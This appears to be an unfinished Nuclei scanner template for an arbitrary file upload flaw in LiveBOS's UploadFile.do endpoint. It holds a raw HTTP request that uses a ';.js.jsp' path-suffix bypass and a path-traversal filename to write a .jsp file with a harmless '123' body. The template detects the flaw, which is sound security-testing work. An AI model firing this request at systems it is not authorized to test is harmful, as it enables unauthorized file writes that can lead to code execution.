id: livebos-UploadFile-upload
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: LiveBOS UploadFile.do 接口存在任意文件上传漏洞
  reference:
    - https://
  tags: tags
variables:
  filename: "{{to_lower(rand_base(10))}}"
http:
  - raw:
      - |-
        POST /feed/UploadFile.do;.js.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
        Accept: */*
        Content-Type: multipart/form-data; boundary=---------------------------45250802924973458471174811279
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Length: 227

        -----------------------------45250802924973458471174811279
        Content-Disposition: form-data; name="file"; filename="//../../../../{{filename}}.jsp"
        Content-Type: image/png

        123
        -----------------------------45250802924973458471174811279
    matchers:
      - type: word
        part: body
        words:
          - '.jsp'
